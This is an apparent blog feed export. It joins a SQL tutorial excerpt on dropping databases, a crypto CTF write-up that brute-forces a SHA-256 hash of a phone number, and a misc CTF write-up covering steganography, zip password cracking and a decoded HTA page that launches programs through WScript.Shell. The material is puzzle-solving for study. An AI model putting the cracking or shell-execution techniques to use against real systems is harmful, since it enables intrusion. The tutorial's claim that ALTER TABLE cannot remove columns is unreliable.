<p>Some database management systems also provide the <strong>DROP DATABASE</strong> statement, which is identical in usage to the <strong>DROP TABLE</strong> statement. The syntax for this statement is as follows:</p>
<p>DROP DATABASE database_name</p>
<p><strong>NOTE:</strong> The various relational database implementations require you to take different steps to drop a database. After the database is dropped, you will need to clean up the operating system files that compose the database.</p>
<p><strong>Exercise 9.2</strong></p>
<p>Create a database with one table in it. Issue the <strong>DROP TABLE</strong> command and the issue the <strong>DROP DATABASE</strong> command. Does your database system allow you to do this? Single-file based systems, such as Microsoft Access, do not support this command. The database is contained in a single file. To create a database, you must use the menu options provided in the product itself. To delete a database, simply delete the file from the hard drive.</p>
<p><strong>Summary</strong></p>
<p>It covers the major features of SQL’s Data Manipulation Language (DML). In particular, you learned five new statements: <strong>CREATE DATABASE</strong>, <strong>CREATE TABLE</strong>, <strong>ALTER TABLE</strong>, <strong>DROP TABLE</strong>, and <strong>DROP DATABASE</strong>. It also discusses the importance of creating a good database design.</p>
<p>A data dictionary is one of the most important pieces of documentation you can create when designing a database. This dictionary should include a complete description of all objects in the database: tables, fields, views, indexes, stored procedures, triggers, and so forth. A complete data dictionary also contains a brief comment explaining the purpose behind each item in the database. You should update the data dictionary whenever you make changes to the database.</p>
<p>Before using any of the data manipulation statements, it is also important to create a good database design. Break down the required information into logical groups and try to identify a primary key field that other groups (or tables) can use to reference this logical group. Use foreign key fields to point to the primary or foreign key fields in other tables.</p>
<p>You learned that the <strong>CREATE DATABASE</strong> statement is not a standard element within database systems. This variation is primarily due to the many different ways vendors store their databases on disk. Each implementation enables a different set of features and options, which results in a completely different <strong>CREATE DATABASE</strong> statement. Simply issuing <strong>CREATE DATABASE database_name</strong> creates a default database with a default size on most systems. The <strong>DROP DATABASE</strong> statement permanently removes that database.</p>
<p>The <strong>CREATE TABLE</strong> statement creates a new table. With this command, you can create the fields you need and identify their data types. Some database management systems also allow you to specify other attributes for the field, such as whether it can allow <strong>NULL</strong> values or whether that field should be unique throughout the table. The <strong>ALTER TABLE</strong> statement can alter the structure of an existing table. The <strong>DROP TABLE</strong> statement can delete a table from a database.</p>
<p><strong>Q&amp;A</strong></p>
<p><strong>Q Why does the</strong> <strong>CREATE DATABASE</strong> <strong>statement vary so much from one system to another?</strong></p>
<p><strong>A</strong> <strong>CREATE DATABASE</strong> varies because the actual process of creating a database varies from one database system to another. Small PC-based databases usually rely on files that are created within some type of application program. To distribute the database on a large server, related database files are simply distributed over several disk drives. When your code accesses these databases, there is no database process running on the computer, just your application accessing the files directly. More powerful database systems must take into account disk space management as well as support features such as security, transaction control, and stored procedures embedded within the database itself. When your application program accesses a database, a database server manages your requests (along with many others’ requests) and returns data to you through a sometimes complex layer of middleware.</p>
<p><strong>Q Can I create a table temporarily and then automatically drop it when I am done with it?</strong></p>
<p><strong>A</strong> Yes. Many database management systems support the concept of a temporary table. This type of table is created for temporary usage and is automatically deleted when your user’s process ends or when you issue the <strong>DROP TABLE</strong> command.</p>
<p><strong>Q Can I remove columns with the</strong> <strong>ALTER TABLE</strong> <strong>statement?</strong></p>
<p><strong>A</strong> No. The <strong>ALTER TABLE</strong> command can be used only to add or modify columns within a table. To remove columns, create a new table with the desired format and then select the records from the old table into the new table.</p>
]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯青龙组初赛复现Writeup</title>
    <url>/2022/09/01/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0Writeup/</url>
    <content><![CDATA[<p>​    这场比赛，在赛中及其坐牢，自己一直学的Web没派上什么用场，还是积蓄不够，倒是密码很有意思，赛后主要复现Crypto去了。qwq</p>
<span id="more"></span>
<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1>
<h2 id="crypto091"><a class="markdownIt-Anchor" href="#crypto091"></a> crypto091</h2>
<p>根据题意，猜测一波sha256，上脚本爆破，赛后有好友说可以用hashcat，自己没弄出来，还是安心写脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="built_in">hash</span> = <span class="string">&#x27;c22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc&#x27;</span></span><br><span class="line">m = <span class="string">&#x27;86170&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>*<span class="number">8</span>)://<span class="number">0</span>-<span class="number">9</span>十位数填充八位，所以循环<span class="number">10</span>*<span class="number">8</span>次</span><br><span class="line">    phone_number = m + <span class="built_in">str</span>(i).zfill(<span class="number">8</span>)//匹配爆破的数</span><br><span class="line">    <span class="keyword">if</span> sha256(phone_number.encode()).hexdigest() == <span class="built_in">hash</span>:</span><br><span class="line">        //匹配填充后的电话号码<span class="built_in">hash</span>值</span><br><span class="line">        <span class="built_in">print</span>(phone_number)</span><br><span class="line">‘‘‘</span><br><span class="line"><span class="number">8617091733716</span></span><br><span class="line">’’’</span><br></pre></td></tr></table></figure>
<h2 id="crypto405"><a class="markdownIt-Anchor" href="#crypto405"></a> crypto405</h2>
<p>先看题目给的out.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Grasshopper#00:2066</span><br><span class="line">Grasshopper#01:a222</span><br><span class="line">Grasshopper#02:cbb1</span><br><span class="line">Grasshopper#03:dbb4</span><br><span class="line">Grasshopper#04:deb4</span><br><span class="line">Grasshopper#05:b1c5</span><br><span class="line">Grasshopper#06:33a4</span><br><span class="line">Grasshopper#07:c051</span><br><span class="line">Grasshopper#08:3b79</span><br><span class="line">Grasshopper#09:6bf8</span><br><span class="line">Grasshopper#10:2131</span><br><span class="line">Grasshopper#11:2c40</span><br><span class="line">Grasshopper#12:91ba</span><br><span class="line">Grasshopper#13:7b44</span><br><span class="line">Grasshopper#14:5f25</span><br><span class="line">Grasshopper#15:0208</span><br><span class="line">Grasshopper#16:7edb</span><br><span class="line">Grasshopper#17:62b5</span><br><span class="line">Grasshopper#18:cec5</span><br><span class="line">Grasshopper#19:5ab3</span><br><span class="line">Grasshopper#20:3c46</span><br><span class="line">Grasshopper#21:c272</span><br><span class="line">Grasshopper#22:714b</span><br><span class="line">Grasshopper#23:9e0b</span><br><span class="line">Grasshopper#24:48ee</span><br><span class="line">Grasshopper#25:44cc</span><br><span class="line">Grasshopper#26:05a0</span><br><span class="line">Grasshopper#27:3da3</span><br><span class="line">Grasshopper#28:11b1</span><br><span class="line">Grasshopper#29:259f</span><br><span class="line">Grasshopper#30:899d</span><br><span class="line">Grasshopper#31:a130</span><br><span class="line">Grasshopper#32:e58f</span><br><span class="line">Grasshopper#33:23f3</span><br><span class="line">Grasshopper#34:5829</span><br><span class="line">Grasshopper#35:6beb</span><br><span class="line">Grasshopper#36:3681</span><br><span class="line">Grasshopper#37:0054</span><br><span class="line">Grasshopper#38:a189</span><br><span class="line">Grasshopper#39:2765</span><br><span class="line">Grasshopper#40:c63d</span><br><span class="line">Grasshopper#41:bc68</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <url>/2022/08/25/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="dest0g3-520迎新赛"><a class="markdownIt-Anchor" href="#dest0g3-520迎新赛"></a> Dest0g3 520迎新赛</h1>
<p>Dest0g3首次招新啦！</p>
<p>Dest0g3 Team现逐步发展到各大高校及安全公司均有成员分布，在过去的半年里先后取得L3HCTF第十、SCTF第六及SUSCTF第四的优异成绩。</p>
<p>首届Dest0g3 520迎新赛更加注重CTFer的基础知识面掌握程度，由易到难，适合各学习阶段选手参加，纯萌新水准。</p>
<p>Dest0g3期待更多新生力量的加入，如有意向请在赛后提交wp与简历，或联系@Dest0g3 Team （QQ：1115230222）</p>
<p>比赛时间：2022.5.20 10:00 - 5.27 10:00</p>
<p>题目分类：Web、Pwn、Misc、Crypto、Re、AI、BlockChain</p>
<p>题目难度：萌新</p>
<p>比赛类型：个人赛</p>
<p>比赛交流QQ群：923945203</p>
<p>个人赛奖励：总榜前10及各方向前三均可获得《从0到1：CTFer成长之路》一本 + 定制U盘（32G）一个</p>
<span id="more"></span>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="welcome-to-fxxking-destctf"><a class="markdownIt-Anchor" href="#welcome-to-fxxking-destctf"></a> Welcome to fxxking DestCTF</h3>
<p>**题目描述：**关注公众号并回复：Give me the fxxking flag</p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/8fc59c32ce5bcf7da3917ad4a3a023ba/jpg">https://files.buuoj.cn/files/8fc59c32ce5bcf7da3917ad4a3a023ba/jpg</a></p>
<p><strong>做题过程：</strong></p>
<p>将附件拖入浏览器查看。获得二维码，扫码关注公众号，输入提示给的：Give me the fxxking flag</p>
<p><img src="https://img-blog.csdnimg.cn/c2001876496f4c2292e236787d6a1064.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获取flag：Dest0g3{W31c0m3_t0_DestCTF2022!}</p>
<h3 id="pngenius"><a class="markdownIt-Anchor" href="#pngenius"></a> Pngenius</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/5a64d4c2532f28b79aa99089c3f76ff5/Dest0g3.png">https://files.buuoj.cn/files/5a64d4c2532f28b79aa99089c3f76ff5/Dest0g3.png</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、获取图片是PNG格式，首先想到的就是LSB隐写，使用工具stegslove查看</p>
<p>在r 0 g 0 b 0处发现有变化。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/359af78c6f5a4c589951a0fb06d41b4f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="https://img-blog.csdnimg.cn/86ffb3a2a628455bbc8753c9aae546c4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="https://img-blog.csdnimg.cn/56a9f5ded36347ce90a55fc14aa8cbc5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、使用stegslove自带的Data Extract 数据提取工具对三处异常，进行查看。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/321e9f64811e4ff9b9a7173a133de680.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="https://img-blog.csdnimg.cn/bbb2325b1ca949c78345c512a80b0baf.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>3、 得到一个压缩包的解压密码，返回图片，使用binwalk进行扫描，并提取压缩包</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2c43f5298f2944ff9db941fc40514f10.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>4、输入压缩包密码Weak_Pas5w0rd，打开压缩包，获取flag.txt。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/c0beb361c71f491cb15e387b11233fab.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获取flag：Dest0g3{2908C1AA-B2C1-B8E6-89D1-21B97D778603}</p>
<h3 id="easyencode"><a class="markdownIt-Anchor" href="#easyencode"></a> EasyEncode</h3>
<p>**题目描述：**Enjoy Decoding</p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/2fb77a72cba82a4c9a749998a1073e58/encode.zip">https://files.buuoj.cn/files/2fb77a72cba82a4c9a749998a1073e58/encode.zip</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>下载附件，是个ZIP文件，解压，发现有加密，丢进010 edtier中查看</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/9366225f80f442268e5d39bc432269e6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、发现不是伪加密，于是试着用ARCHPR爆破一下，密码长度选择4-6位。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/014592d521754099affcc8d040053bb5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得密码100861，解压压缩包,打开文本文件，发现摩斯编码：</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/69d19aa758f54c6ca6765360a63ef07e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>3、下面就是解码过程：</p>
</blockquote>
<blockquote>
<p>运用在线工具<a href="https://www.lddgo.net/encrypt/morse">在线摩斯密码翻译器 (lddgo.net)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7cb0a08d95c84f52a15831cb7f247b5b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得一串Hex（十六进制）编码，运用在线工具<a href="https://the-x.cn/encodings/Hex.aspx">HEX转字符 十六进制转字符 hex gb2312 gbk utf8 汉字内码转换 - The X 在线工具 (the-x.cn)</a>转字符：</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2051da8075304abcae5cca6dbdc2ddae.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得一串unicode编码，使用在线工具<a href="https://tool.chinaz.com/tools/unicode.aspx">Unicode编码转换 - 站长工具 (chinaz.com)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/484a9cb95ec9408d9ad2905d7b59f600.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>“%3D”在url编码中是“=”’，所以进行base64解码，运用在线工具：<a href="https://the-x.cn/zh-cn/base64">Base64解码 Base64编码 UTF8 GB2312 UTF16 GBK 二进制 十六进制 解密 - The X 在线工具 (the-x.cn)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/da9e343502734ca89a6f8cd6baf55939.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获得flag：Dest0g3{Deoding_1s_e4sy_4_U}</p>
<h3 id="你知道js吗"><a class="markdownIt-Anchor" href="#你知道js吗"></a> 你知道js吗</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/5f1fc294b6468f733b774ceee6106062/flag">https://files.buuoj.cn/files/5f1fc294b6468f733b774ceee6106062/flag</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、下载，附件，懒了，不想开010，直接吧附件扔到浏览器，浏览器自动编译后下载了一个flag.zip文件</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/ffa9b6c56dc641e0b5db406f890eb691.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、打开压缩包，看到一堆XML格式的文件，直接扔浏览器里。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/fe2bbcc56eea4328b710beee5cdfb457.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>在docoment.xml中发现三串base64特征字符，拼接解码后获得</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">assembly</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span> <span class="attr">manifestVersion</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">trustInfo</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">requestedExecutionLevel</span> <span class="attr">level</span>=<span class="string">&quot;asInvoker&quot;</span> <span class="attr">uiAccess</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dpiAwareness</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;</span>&gt;</span>Do you know js<span class="tag">&lt;/<span class="name">dpiAwareness</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="built_in">unescape</span>(<span class="string">&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>辨别解码后是，url编码，在线工具解码<a href="https://the-x.cn/zh-cn/UrlDecode.aspx">UrlDecode解码/UrlEncode编码 GB2312 UTF8 - The X 在线工具 (the-x.cn)</a>：</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Do You Know js<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTA:APPLICATION</span></span></span><br><span class="line"><span class="tag">  <span class="attr">APPLICATIONNAME</span>=<span class="string">&quot;Do You Know js&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">ID</span>=<span class="string">&quot;Inception&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">VERSION</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">SCROLL</span>=<span class="string">&quot;no&quot;</span>/&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;feature&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">				</span></span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;unavailable&quot;</span> <span class="attr">class</span>=<span class="string">&quot;loading&quot;</span>&gt;</span>Building js.....<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">					<span class="keyword">function</span> <span class="title function_">RunFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> <span class="title class_">WshShell</span> = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">					<span class="title class_">WshShell</span>.<span class="title class_">Run</span>(<span class="string">&quot;notepad %windir%/Desktop/js.txt&quot;</span>, <span class="number">1</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">/* var oExec = WshShell.Exec(&quot;notepad&quot;); */</span></span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Implant Inception Here&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;RunFile();&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:white;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- </span><br><span class="line">-.-.- --.++ ++++.</span><br><span class="line">+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- </span><br><span class="line">&gt;---&lt; ]&gt;--- ---.+ ++++. -----</span><br><span class="line">.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.</span><br><span class="line">&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+</span><br><span class="line"> +++++ .---- -.++. ++.+.</span><br><span class="line">--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- </span><br><span class="line">.+.-. ---.+ ++.+. -.+++</span><br><span class="line">+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---</span><br><span class="line">-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ </span><br><span class="line">.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.</span><br><span class="line">+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ </span><br><span class="line">.---- .+.++ ++.-- --.++</span><br><span class="line">++.-. ----. +.-.+ ++++. </span><br><span class="line">&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&#x27;));<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
